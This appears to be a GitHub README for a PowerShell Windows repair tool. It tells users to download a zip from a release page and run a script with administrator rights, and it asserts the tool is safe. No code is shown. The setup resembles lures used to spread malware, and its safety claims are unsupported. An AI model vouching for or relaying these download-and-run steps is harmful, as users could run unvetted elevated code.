# 🛠️ Windows-System-Repair-PowerShell - Fix system errors and restore performance

[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/beaverharoldi275/Windows-System-Repair-PowerShell/releases)

## What this tool does

Windows-System-Repair-PowerShell acts as a diagnostic system for your computer. It identifies and fixes common issues that prevent Windows 10 or 11 from running correctly. Many users encounter blue screens, missing code libraries, or corrupted system files. This tool automates the process of finding these hidden problems and applying the correct fix.

The program uses standard Windows utilities like SFC and DISM to scan your hard drive. It also checks for broken runtime components like Microsoft Visual C++ redistributables and DirectX. It streamlines technical maintenance so you do not need to perform manual command-line tasks.

## Before you begin 📋

This tool requires Windows 10 or Windows 11. Ensure that you have an active internet connection before you start. The program needs to download essential system files from official Microsoft servers if your current ones are damaged.

Save your open documents and close all running applications. The tool modifies system settings to perform repairs. A restart of your computer usually occurs after the process finishes.

## How to download the software 📥

You obtain the software from the official release page. 

[Click here to visit the release page and download the software](https://github.com/beaverharoldi275/Windows-System-Repair-PowerShell/releases)

1. Open the link in your web browser.
2. Look for the section titled Latest.
3. Locate the download link for the zip file.
4. Click the link to save the file to your computer.
5. Move the downloaded file to a location where you can find it, such as your desktop.

## Preparing the files 📂

The file arrives in a zipped format. Windows must extract these files before you can use the software.

1. Right-click the downloaded folder.
2. Select Extract All from the menu.
3. Choose a folder on your computer to save the items.
4. Select the Extract button.
5. Open the new folder created by the extraction process.

## Running the repair tool ⚙️

The application uses a PowerShell script to run commands with administrative permissions.

1. Find the file named Run_Repair.ps1 inside the folder.
2. Right-click the file.
3. Select Run with PowerShell from the menu.
4. If a blue window appears asking for permission to run, select Yes or Run.
5. A text window opens on your screen. This window shows the progress of the repairs.

Do not close this window while the script runs. The window will display updates as it checks for missing DLL files, repairs corrupted system files, and updates DirectX components. The process takes several minutes depending on the speed of your hardware.

## Understanding the repair steps 🔍

The tool follows a specific order to ensure system stability.

### System File Checker (SFC)
The tool first runs the System File Checker. This utility scans protected system files and replaces corrupted files with a cached copy from your Windows installation. 

### Deployment Image Servicing and Management (DISM)
If SFC fails to resolve an issue, the tool uses DISM. This utility communicates with Windows Update to download healthy versions of system components. This step addresses deep corruption that standard scans miss.

### Runtime and Graphics Updates
Many errors stem from missing code libraries. The script verifies that Microsoft Visual C++ redistributables exist on your system. It also ensures that your DirectX installation remains current. This fixes errors where programs fail to launch due to missing library files.

### Blue Screen (BSOD) Logic
The script checks common configuration settings that lead to unexpected blue screen errors. It attempts to reset these settings to their default values to stop frequent system crashes.

## After the process finishes ✅

Once the script completes its work, your screen will display a message indicating success. The window will ask you to press any key to exit. 

1. Close the window by pressing any key on your keyboard.
2. Save your progress if you changed any window settings.
3. Restart your computer.

The restart allows Windows to apply all changes made by the repair script. Once the computer turns back on, test the functions that previously caused errors. Most users notice that applications launch normally and system stability improves immediately.

## Troubleshooting common issues 🔧

If the program closes unexpectedly, check your user permissions. You must be logged in as an Administrator to run the repair tools. If you use a standard account, log out and sign in with an account that has full system access.

If the script hangs at a specific percentage, wait five minutes before you assume a failure. DISM often pauses while it downloads files from the internet. A slow connection can cause this delay. Do not disconnect your internet while the script runs.

If specific errors continue after the repair, your hardware might require attention. This tool fixes software and system file errors. It does not replace damaged hard drives or failing memory sticks. If the blue screen errors persist after you run this tool, consult a hardware technician to check your physical components.

## Support 💬

This tool relies on public Windows utilities. Because it uses tested Microsoft commands, it remains safe for your system. If you run into issues, verify that you downloaded the latest version from the link provided in this document. Updates to the script happen frequently to ensure compatibility with the latest versions of Windows 10 and 11. 

You can report issues on the official repository page if you encounter recurring problems. Please note the specific error code you see on your screen before you report it. This information helps others understand if their computer experiences a similar problem.